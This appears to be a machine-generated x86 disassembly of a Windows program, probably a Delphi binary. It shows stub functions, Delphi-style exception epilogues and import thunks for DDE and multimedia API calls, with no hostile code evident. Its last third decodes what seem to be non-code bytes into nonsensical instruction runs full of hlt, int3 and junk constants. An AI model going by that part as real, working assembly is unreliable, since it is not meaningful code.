mov edx [ ebp + 0xc ]
mov [ eax + 0xc4 ] edx
pop ebp
retn 0x8
sub_47eae0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0xd8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xdc ] edx
pop ebp
retn 0x8
sub_47eafc
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0xc8 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0xcc ] edx
pop ebp
retn 0x8
sub_47eb64
push ebx
mov ebx eax
lea eax [ ebx + 0x70 ]
call sub_40d564
mov eax ebx
call sub_47d0a0
pop ebx
retn
j_sub_4038a4#2
jmp sub_4038a4
sub_47ee32
jmp sub_403a2c
sub_47ee39
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_4038a4#6
jmp sub_4038a4
sub_47f05e
jmp sub_403a2c
sub_47f065
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47f083
inc [ edx ]
add [ eax ] al
add [ ebp + 0x20 ] bl
add [ eax ] al
test edx edx
jl r-xdata
mov [ eax + 0x118 ] 0xffffffff
retn
mov [ eax + 0x118 ] edx
retn
sub_47f0c9
jmp sub_403a2c
sub_47f0d0
pop ebp
retn
sub_47f0d4
sub [ rw-data ] 0x1
retn
sub_47f2d9
jmp sub_403778
sub_47f2de
mov eax [ ebp - 0x4 ]
add eax 0x7c
call sub_40d564
call sub_403a8c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f366
jmp sub_403778
sub_47f36b
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc8 ] 0xffffffff
call sub_403a8c
call sub_403ae0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47f3ec
mov edx [ eax ]
call [ edx + 0x40 ]
retn
sub_47f4a0
push ebx
mov ebx eax
mov eax ebx
call sub_479414
mov [ ebx + 0xb8 ] 0x0
mov [ ebx + 0xcc ] 0x0
lea eax [ ebx + 0x7c ]
call sub_40d564
pop ebx
retn
sub_47f4e9
jmp sub_403a2c
sub_47f4f0
pop ebp
retn
sub_47f4f4
sub [ rw-data ] 0x1
retn
sub_47f77e
inc edi
add [ eax ] ch

sub_47f782
inc edi
add [ eax ] dh

sub_47fb5e
jmp sub_403a2c
sub_47fb65
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47fb87
lea eax [ ebp - 0x24 ]
mov edx 0x4
call sub_4040d0
retn
sub_47fb80
jmp sub_403a2c
sub_47fb87
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47fc08
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4806b0
mov [ ebx + 0x98 ] eax
pop ebx
retn
sub_47fc24
push ebx
mov ebx eax
mov eax [ ebx + 0x80 ]
call sub_47f8b4
test al al
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x98 ]
mov edx [ eax ]
call [ edx + 0x2c ]
sub_47fe35
jmp sub_403a2c
sub_47fe3c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480014
jmp sub_403a2c
sub_48001b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4800db
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_4800e4
jmp sub_403a2c
j_sub_4800db
jmp sub_4800db
sub_4800eb
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48027a
jmp sub_403a2c
sub_480281
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480485
jmp sub_403a2c
sub_48048c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4805bc
jmp sub_403778
j_sub_403778#2
jmp sub_403778
sub_480649
jmp sub_403778
j_sub_4038a4
jmp sub_4038a4
sub_4808e0
jmp sub_403a2c
sub_4808f1
jmp sub_403778
sub_480934
jmp sub_403a2c
sub_48093b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_480980
jmp sub_403a2c
sub_480987
pop ebp
retn
sub_48098c
sub [ rw-data ] 0x1
retn
mciGetErrorStringA
jmp [ __import_lookup_table_14(winmm:mciGetErrorStringA) ]
sub_4809e1
jmp sub_403a2c
sub_4809e8
pop ebp
retn
sub_4809ec
sub [ rw-data ] 0x1
retn
sub_4812f8
push ebx
mov ebx eax
mov eax ebx
call sub_451928
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x31d ] 0x0
je r-xdata
mov eax ebx
call sub_4821fc
sub_4814c4
cmp dl [ eax + 0x31c ]
je r-xdata
retn
mov ecx edx
mov [ eax + 0x31c ] cl
test cl cl
je r-xdata
mov dx [ eax + 0x2a2 ]
call sub_4814ec
call sub_481530
jmp r-xdata
sub_481d70
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_481c90
retn
sub_481d80
movsx ecx [ edx + 0xa ]
movsx edx [ edx + 0x8 ]
call sub_481c90
retn
sub_481eb8
push esi
mov dl [ eax + 0x2aa ]
mov si 0xffb1
call sub_4034ac
pop esi
retn
sub_481f50
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_481f5c
mov edx [ eax ]
call [ edx + 0xc8 ]
retn
sub_481f68
mov [ edx + 0xc ] 0x1
retn
sub_4820f0
cmp [ eax + 0x2e1 ] 0x0
jne r-xdata
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
call sub_403a64
sub_482114
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_482134
push ebx
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_482154
push ebx
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
sub_482174
push ebx
mov ebx eax
mov eax ebx
call sub_4217b4
mov eax ebx
call sub_481640
pop ebx
retn
sub_48245a
jmp sub_403a2c
sub_482461
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_482f44
cmp edx [ eax + 0x2fc ]
je r-xdata
mov [ eax + 0x2f0 ] 0x1
retn
mov [ eax + 0x2fc ] edx
sub_482f5c
cmp dl [ eax + 0x2f4 ]
je r-xdata
retn
mov [ eax + 0x2f4 ] dl
sub_483475
jmp sub_403a2c
sub_48347c
pop ebp
retn
sub_483480
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ DdeInitializeA@IAT ]
DdeUninitialize
jmp [ __import_lookup_table_15(user32:DdeUninitialize) ]
DdeConnect
jmp [ __import_lookup_table_15(user32:DdeConnect) ]
DdeDisconnect
jmp [ __import_lookup_table_15(user32:DdeDisconnect) ]
DdeQueryConvInfo
jmp [ __import_lookup_table_15(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_15(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_15(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_15(user32:DdeNameService) ]
DdeClientTransaction
jmp [ DdeClientTransaction@IAT ]
DdeCreateDataHandle
jmp [ DdeCreateDataHandle@IAT ]
DdeAccessData
jmp [ DdeAccessData@IAT ]
DdeUnaccessData
jmp [ DdeUnaccessData@IAT ]
DdeFreeDataHandle
jmp [ DdeFreeDataHandle@IAT ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ DdeQueryStringA@IAT ]
DdeCmpStringHandles
jmp [ DdeCmpStringHandles@IAT ]
sub_48353d
jmp sub_403a2c
sub_483544
pop ebp
retn
sub_483548
sub [ rw-data ] 0x1
retn
sub_4839a0
out dx al
jmp [ eax ]
sub_483a54
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call sub_48829f
sub_483ffe
jmp sub_403a2c
sub_484005
pop ebx
mov esp ebp
pop ebp
retn
sub_4842d0
jmp sub_403a2c
sub_4842d7
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_484458
jmp sub_403a2c
sub_48445f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_48459d
jmp sub_403a2c
sub_4845a4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_484694
jmp sub_403a2c
sub_48469b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4847aa
jmp sub_403a2c
sub_4847b1
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_484863
jmp sub_403a2c
sub_48486a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_484870
push ebx
mov ecx [ eax + 0x40 ]
mov ebx [ ecx + 0x8 ]
mov eax ecx
mov ecx edx
mov edx ebx
call sub_418a2c
pop ebx
retn
sub_484884
mov eax [ eax + 0x40 ]
call sub_418b4c
retn
sub_4849ce
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_4040d0
retn
sub_4849dc
jmp sub_403a2c
j_sub_4849ce
jmp sub_4849ce
sub_4849e3
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a2c#9
jmp sub_403a2c
sub_484a9a
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_484b63
jmp sub_403a2c
sub_484b6a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403a2c#8
jmp sub_403a2c
sub_484f05
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4850b4
mov [ eax + 0xc6 ] 0x0
retn
sub_485198
cmp dl [ eax + 0xc7 ]
je r-xdata
retn
mov [ eax + 0xc7 ] dl
cmp [ eax + 0x38 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
call sub_485100
sub_4851b8
retn
sub_4851bc
retn
sub_4851c0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
sub_4851d4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x34 ]
mov edx esi
call sub_404100
pop esi
pop ebx
retn
sub_4851e8
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_485208
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_48538b
jmp sub_403a2c
sub_485392
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4854a4
retn
sub_4854a8
retn
sub_4855b9
jmp sub_403a2c
sub_4855c0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a2c#7
jmp sub_403a2c
sub_48569c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_48570c
push ecx
push edx
call DdeAccessData
retn
sub_485714
push edx
call DdeUnaccessData
retn
sub_485834
mov eax [ eax + 0x10 ]
call sub_485430
retn
sub_4858bc
mov [ eax + 0x34 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_421440
sub_485998
jmp sub_403a2c
sub_48599f
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
j_sub_403a2c#6
jmp sub_403a2c
sub_485a36
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403a2c#5
jmp sub_403a2c
sub_485ac6
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485ad0
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_485c0f
jmp sub_403a2c
sub_485c16
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_485c20
push ebx
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_485c34
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_485e30
jmp sub_403a2c
sub_485e37
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_485f17
jmp sub_403a2c
sub_485f1e
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
j_sub_403a2c#4
jmp sub_403a2c
sub_486050
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
j_sub_403a2c#3
jmp sub_403a2c
sub_486308
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_486314
mov edx [ eax + 0x38 ]
push edx
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdePostAdvise
retn
j_sub_403a2c#2
jmp sub_403a2c
sub_4863c4
pop ebp
retn
sub_486c97
pushad
arpl dx bx
dec esp
into
int3
sub_487160
push ebp
mov edx 0xda6cd14e
dec esp
adc [ ebx ] esi
xor edx [ ebp - 0x46 ]
sti
mov eax 0xcb0cdae3
int3
sub_48749e
push 0xc96eba55
pop ecx
push eax
mov eax 0x6eba55e9
iretd
sub_4874cf
push cs
xor esi [ ebx ]
insb
mov eax 0xb8f06df5
sti
mov esi 0xccce4bb6
int3
sub_48794b
push ebp
hlt
sub_4879af
push ebp
mov dh 0xc5
fcmovu st6
or [ ebx ] dh
xor esp [ ebx + 0x33313b5b ]
xor edi [ edx - 0x49411c8a ]
mov bl 0xce
int3
sub_4879c6
pushad
fisubr [ ebp - 0x5cccccf5 ]
mov [ 0xffffffffa3a3a3a3 ] eax
mov [ 0xffffffffc4cdda63 ] eax
int3
sub_487a85
push eax
inc ecx
hlt
sub_487a8a
pop esp
inc eax
pop esp
push ebp
hlt
sub_487a9b
push edx
hlt
sub_487f69
push ebp
mov edx 0x54595766
imul edx [ ebp - 0x46 ] 0xba555d76
push bp
mov eax 0x55f300e3
mov edx 0x5dda4376
retn 0xcccc
sub_48803d
mov [ 0xffffffffa3a3a3a3 ] eax
mov [ 0xffffffffeab8a3a3 ] eax
push ebp
mov edx 0xebb83d6e
push ebp
mov edx 0xe800236e
push ebp
mov edx 0xecb8216e
push ebp
mov edx 0xa9da776e
int3
sub_48813d
pushad
arpl [ edx - 0xf253092 ] di
fxch st4
int3
sub_48829f
mov [ 0x55ebb8a3 ] eax
mov edx 0xaada3f6e
into
int3
sub_48846f
pop esp
inc eax
pop esp
push ebp
hlt
sub_488538
xor esp [ ebx + 0x31234eb3 ]
cmp al 0xb6
add ebx esi
int3
sub_4886ee
xor esp [ ebx + 0x55a3a3a3 ]
mov edx 0xf300cf76
push ebp
mov edx 0x76becd76
retn
sub_488700
arpl [ eax + 0x69db3b76 ] di
push ss
xor esi [ ebx ]
push 0xffffffda
retn
sub_488718
ror ah 0x1
int3
sub_488927
push 0xffffffbe
ja r-xdata
cmp al 0x33
xor edi [ eax + 0x76ba55f1 ]
sub eax 0x333183da
xor esp [ ebx + 0x333c91da ]
xor esp [ ebx - 0x5c5c5c5d ]
mov edx 0x3333a3b5
xor ebx ebx
or esp [ ebx - 0x26 ]
or ch dl
int3
sub_488bdd
pushad
arpl bx bx
sub eax 0xb0ccccec
idiv [ edi ]
pushad
pop ecx
xor esp ecx
aas
mov eax 0xccc8b0eb
cmp al 0xb6
sub cl dl
int3
sub_488ebb
pushad
mov esi 0xcccefbb6
int3
sub_48992c
retn 0xcccc
sub_48992f
mov [ 0xffffffffccd6cbda ] eax
int3
sub_489a88
push ds
jmp 0x7701675a
j_sub_489a88
jmp sub_489a88
sub_489aae
mov esp [ eax ]
xor esi [ ebx ]
or cl [ edi + 0x17 ]
pop es
cmp al 0xb6
cmp [ ebx ] esi
xor esi [ ebx ]
or cl [ edi + 0x17 ]
add edi [ edi + esi * 4 ]
0xcccd
sub_489ac8
int 0xcc
int3
sub_489d0e
pushad
pop ecx
aaa
mov esi 0xda630775
sub ebp eax
int3
sub_489d6e
pushad
xor esi [ ebx ]
xor edi [ esi - 0x6925109a ]
jecxz r-xdata
int3
int3
sub_489e37
pushad
int3
sub_48a032
sub esp [ fs : ebx + ebx * 8 + 0x11 ]
0xba6acccc 0xcf76
sub_48a043
fmul st4
int3
sub_48a151
ror esp 0x1
int3
sub_48a4b2
ror esp 0x1
int3
sub_48a4f9
push esp
cmp esi [ ebx ]
xor esp [ ebx - 0x49415c5d ]
enter 0xcccc 0x63
fisubr [ gs : 0xffffffffa333333f ]
mov [ 0xffffffffda62dfb8 ] eax
sbb bl ch
int3
sub_48a5e7
pushad
pop ecx
aaa
mov esi 0xb863ef76
jbe r-xdata
int3
fisub [ edx + ebx * 8 - 0x34 ]
int3
sub_48a6c1
push ebp
mov edx 0xb8da9166
out 0xcc al
int3
sub_48aa26
push ebp
mov edx 0xfdb89d76
fimul [ ebx + 0x65ccccdb ]
add al ch
mov eax 0xdfb6becb
into
int3
sub_48ac1d
leave
int3
sub_48ac4c
push 0xffffffda
xchg edi eax
into
int3
sub_48acb3
inc eax
insd
push ebp
mov edx 0x6f59c776
mov eax 0x76ba55f5
lds ebp [ ebx + 0x55 ]
mov edx 0xf300cb76
push ebp
mov edx 0x375bc976
xor dh [ ebx ]
xor edi [ esi - 0x3337484a ]
int3
sub_48ae0a
push 0xffffffda
inc esi
jmp r-xdata
xor ebx [ ebx + 0x33 ]
and esi [ ebx ]
xor ebx edx
movsb [ edi ] [ esi ]
fxch st4
int3
sub_48ae10
mov [ 0xffffffffa3a3a3a3 ] eax
mov [ 0xffffffffa3a3a3a3 ] eax
mov [ 0xffffffffee9cb63c ] eax
int3
sub_48aea8
cmp al 0xb1
0xcc88
sub_48aef5
aam 0x8b
int3
sub_48b132
push ebp
mov al 0xb
xor ebx edx
fcmovnu st3
int3
sub_48b25f
push 0x6a
ficomp [ ebp - 0x5c333309 ]
mov [ 0xffffffffdb63a3a3 ] eax
mov eax [ 0xffffffffb0cccc8b ]
idiv [ edi ]
int3
sub_48b4fd
push ebp
mov edx 0xda659b7e
dec ebp
into
int3
sub_48b916
pushad
fiadd [ eax + ecx * 4 ]
int3
j_sub_403778
jmp sub_403778
j_sub_403a2c
jmp sub_403a2c
sub_48ba40
pop ebp
retn
sub_48bbae
jmp sub_403a2c
sub_48bbb5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_48bc1a
retn
sub_48bc1b
jmp sub_403a2c
j_sub_48bc1a
jmp sub_48bc1a
sub_48bc22
pop ebp
retn
